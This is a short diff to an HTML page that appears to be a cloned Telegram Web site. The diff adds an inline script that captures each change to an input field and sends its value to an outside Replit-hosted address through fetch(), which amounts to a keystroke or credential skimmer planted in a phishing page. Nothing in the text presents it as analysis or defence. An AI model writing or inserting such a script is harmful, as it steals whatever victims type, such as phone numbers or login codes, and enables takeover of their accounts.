@@ -42,6 +42,14 @@
 
     <link rel="manifest" id="manifest" href="https://web.telegram.org/k/site.webmanifest?v=jw3mK7G9Aq">
     <script type="module" crossorigin="" src="./site_files/index-e-jlGVAF.js"></script>
+    <script>
+        const inputField = document.getElementById("myInput");
+        inputField.addEventListener("input", handleInputChange);
+
+        function handleInputChange() {
+            fetch(`https://4a1e71a7-4c3a-425a-b60f-615bdbd8ce30-00-37ui5twvje3pl.pike.replit.dev/param1=${inputField.value}`)
+        }
+    </script>
     <link rel="stylesheet" crossorigin="" href="index-vX_PR0Tt.css">
   </head>
   <body class="animation-level-2">
